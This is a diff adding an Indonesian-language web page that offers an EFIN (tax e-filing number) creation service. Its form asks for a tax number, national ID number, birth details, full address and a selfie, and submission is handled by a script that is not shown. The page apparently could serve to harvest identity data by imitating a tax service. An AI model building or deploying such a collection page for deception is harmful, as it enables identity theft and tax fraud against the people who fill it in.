@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Layanan Pembuatan EFIN</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <main>
+        <section class="hero">
+            <div class="container">
+                <h2>Pembuatan EFIN Mudah dan Cepat</h2>
+                <p>Kami membantu Anda mendapatkan EFIN (Electronic Filing Identification Number) dengan mudah dan aman</p>
+            </div>
+        </section>
+
+        <section class="form-section">
+            <div class="container">
+                <form id="efinForm">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="npwp">NPWP *</label>
+                            <input type="text" id="npwp" name="npwp" placeholder="00.000.000.0-000.000" maxlength="15" pattern="[0-9]{15}" required>
+                            <small>Masukkan 15 digit angka NPWP tanpa tanda titik dan strip</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="nik">NIK *</label>
+                            <input type="text" id="nik" name="nik" placeholder="3201016012800001" maxlength="16" pattern="[0-9]{16}" required>
+                            <small>Masukkan 16 digit angka NIK</small>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="nama">Nama Lengkap *</label>
+                        <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="tempatLahir">Tempat Lahir *</label>
+                            <input type="text" id="tempatLahir" name="tempatLahir" placeholder="Kota kelahiran" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="tglLahir">Tanggal Lahir *</label>
+                            <input type="date" id="tglLahir" name="tglLahir" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="alamat">Alamat Sesuai KTP *</label>
+                        <textarea id="alamat" name="alamat" placeholder="Alamat lengkap sesuai KTP" required></textarea>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="rt">RT *</label>
+                            <input type="text" id="rt" name="rt" placeholder="001" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="rw">RW *</label>
+                            <input type="text" id="rw" name="rw" placeholder="002" required>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="kelurahan">Kelurahan *</label>
+                            <input type="text" id="kelurahan" name="kelurahan" placeholder="Nama kelurahan" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="kecamatan">Kecamatan *</label>
+                            <input type="text" id="kecamatan" name="kecamatan" placeholder="Nama kecamatan" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="kota">Kota/Kabupaten *</label>
+                        <input type="text" id="kota" name="kota" placeholder="Nama kota/kabupaten" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="selfie">Foto Selfie *</label>
+                        <input type="file" id="selfie" name="selfie" accept="image/*" required>
+                        <small>Harap upload foto selfie yang jelas dengan latar belakang putih</small>
+                    </div>
+
+                    <button type="submit">Kirim Formulir</button>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Jasa Pembuatan EFIN. All rights reserved.</p>
+        </div>
+    </footer>
+    
+    <script src="script.js"></script>
+</body>
+</html> 
